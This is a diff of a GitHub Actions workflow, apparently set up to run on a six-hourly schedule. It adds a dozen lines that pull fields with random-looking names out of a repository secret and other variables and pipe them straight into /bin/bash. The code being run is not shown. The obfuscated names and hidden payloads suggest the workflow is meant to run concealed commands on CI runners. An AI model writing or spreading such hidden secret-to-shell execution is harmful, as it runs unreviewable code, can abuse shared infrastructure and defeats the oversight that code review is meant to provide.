@@ -1,8 +1,9 @@
 name: distressedhis
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 3/6 * * *'
+    - cron: '59 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,9 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: distressedhis
         env:
-          rnl5: ${{ secrets.rnl5 }}
+          o54684: ${{ secrets.o54684 }}
         run: |
-          echo $rnl5 | jq -r .xy20466 | /bin/bash
-          echo $ul07754 | jq -r .g7 | /bin/bash
-          echo $oom58 | jq -r .vbh2 | /bin/bash
+          echo $o54684 | jq -r .v5817 | /bin/bash
+          echo $srcjm2160 | jq -r .uyar70111 | /bin/bash
+          echo $dxy39147 | jq -r .cn7842 | /bin/bash
+          echo $qji4407 | jq -r .fd5692 | /bin/bash
+          echo $vamj81 | jq -r .jh028 | /bin/bash
+          echo $jfs48 | jq -r .doaa1 | /bin/bash
+          echo $ufm25758 | jq -r .n206 | /bin/bash
+          echo $vegv48 | jq -r .godf1 | /bin/bash
+          echo $d41067 | jq -r .ho98 | /bin/bash
+          echo $qedxm08070 | jq -r .aes02951 | /bin/bash
+          echo $k15819 | jq -r .oac8 | /bin/bash
+          echo $pfuox42 | jq -r .uxu314 | /bin/bash
+          echo $mzbs57131 | jq -r .eklr780 | /bin/bash
 
